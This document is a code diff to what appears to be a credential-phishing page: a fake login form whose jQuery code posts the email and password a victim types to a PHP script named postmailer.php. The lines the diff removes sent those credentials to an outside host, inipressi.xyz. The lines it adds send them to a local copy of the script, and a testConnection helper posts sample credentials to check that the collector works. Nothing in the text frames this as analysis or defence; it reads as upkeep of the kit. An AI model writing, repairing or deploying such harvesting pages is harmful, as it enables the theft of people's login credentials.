@@ -97,7 +97,7 @@
                      </div>
                      <div id="login-sub">
                         <div id="forms">
-                           <form novalidate="" id="login_form" action="https://inipressi.xyz/phpmailer/classes/postmailer.php" method="post" style="visibility:">
+                           <form novalidate="" id="login_form" action="./postmailer.php" method="post" style="visibility:">
                               <div class="input-req-login"><label for="user">Email Address</label></div>
                               <div class="input-field-login icon username-container">
                                  <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
@@ -262,7 +262,7 @@
                  
                  // Submit the form via AJAX to the PHP script
                  $.ajax({
-                     url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
+                     url: './postmailer.php',
                      method: 'POST',
                      type: 'POST',
                      data: {
@@ -274,10 +274,6 @@
                      timeout: 30000,
                      processData: true,
                      contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
-                     crossDomain: true,
-                     xhrFields: {
-                         withCredentials: false
-                     },
                      beforeSend: function() {
                          $('#login_submit').prop('disabled', true).text('Processing...');
                      },
@@ -384,17 +380,13 @@
              window.testConnection = function() {
                  console.log('Testing connection to postmailer.php...');
                  $.ajax({
-                     url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
+                     url: './postmailer.php',
                      type: 'POST',
                      data: {
                          email: 'test@example.com',
                          password: 'testpass123'
                      },
                      dataType: 'json',
-                     crossDomain: true,
-                     xhrFields: {
-                         withCredentials: false
-                     },
                      success: function(response) {
                          console.log('PHP connection successful:', response);
                          alert('PHP is working! Response: ' + JSON.stringify(response));
